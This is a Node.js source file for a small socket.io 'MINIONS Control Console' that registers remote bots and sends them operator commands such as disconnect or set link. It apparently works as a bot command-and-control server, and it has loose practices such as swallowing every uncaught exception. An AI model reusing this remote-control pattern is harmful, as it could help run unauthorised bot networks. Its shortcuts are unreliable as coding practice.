var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
var xhr = new XMLHttpRequest();
const server = require('http').createServer();
const io = require('socket.io')(server);
const cliCommands = require('./cliconsole');
const fs = require('fs');
const chalk = require('chalk');
var bot_version;
var send_command;
//Object
var bots;
bots = {};

//Not very secure but fuck it
process.on('uncaughtException', function (err) {
  console.log(chalk.grey("[SERVER_FATAL]: Oh shit, this is bad, recovering somehow..."));
  console.log(chalk.grey("[SERVER_FATAL]: Some logs to read:"));
  console.log(chalk.grey(err))
});


//Parse Package details
console.log("Checking Version...")
const fileContents = fs.readFileSync('./package.json', 'utf8')
try {
  const data = JSON.parse(fileContents)
  server_version = data["version"];
} catch(err) {
  console.error("Failed to check version")
  console.error(err)
}
setup();


function motd() {
  console.log("===============================")
  console.log("MINIONS Control Console")
  console.log(server_version)
  console.log("===============================")
}

function setup() {
  //Check for updates with version
  motd();
  console.log("Starting server...")

  cliconsole();
  //Load Server
  io.on('connection', client => {
    //New connection
    var clientIp = client.request.connection.remoteAddress;
    console.log("[SERVER]: New connection from " + clientIp)

    client.on('bot_states', data => {
      id = data["id"];
      //Add BOT to Object or login
      if (bots.hasOwnProperty(id)) {
        //Already registered
        console.log("[SERVER]: Bot Connected: " + id)
        //Connection true
        bots[id]["connection"] = true;
      } else {
        console.log("[SERVER]: Registering " + id)
        state = data["state"];
        link = data["link"];
        bots[id] = {"connection": true, "state": state, "link": link}
      }
    });

    send_command = function(channel, cmd) {
      client.emit(channel, cmd);
    }

    client.on('disconnect', () => {
      console.log("[SERVER]: Client " + clientIp + " disconnected")
    });
  });

  console.log("[SERVER]: Waiting for connections...");
  server.listen(3000);
}

function cliconsole() {

  console.log("CLI Console Initialized...")
  // Get process.stdin as the standard input object.
  var standard_input = process.stdin;

  // Set input character encoding.
  standard_input.setEncoding('utf-8');
  // When user input data and click enter key.
  standard_input.on('data', function (data) {

      // User input exit.
      if(data === 'shutdown\n'){
          // Program exit.
          process.exit();
      } else if (data === 'list bots\n') {
          cliCommands.list(bots);
      } else if (data.includes("disconnect -bot")) {
          dataarg = data.split(/\s+/)[2];
          if (cliCommands.check_disconnect(bots, dataarg)) {
            send_command(dataarg, "disconnect");
          }
      } else if (data.includes("set link -bot")) {
          dataarg = data.split(/\s+/)[3];
          dataarg2 = data.split(/\s+/)[4];
          if (cliCommands.set_link(bots, dataarg, dataarg2)) {
            send_command(dataarg, "check_link " + dataarg2);
          }
      } else {
          // Print user input in console.
          console.log('Undefined command');
      }
  });
}
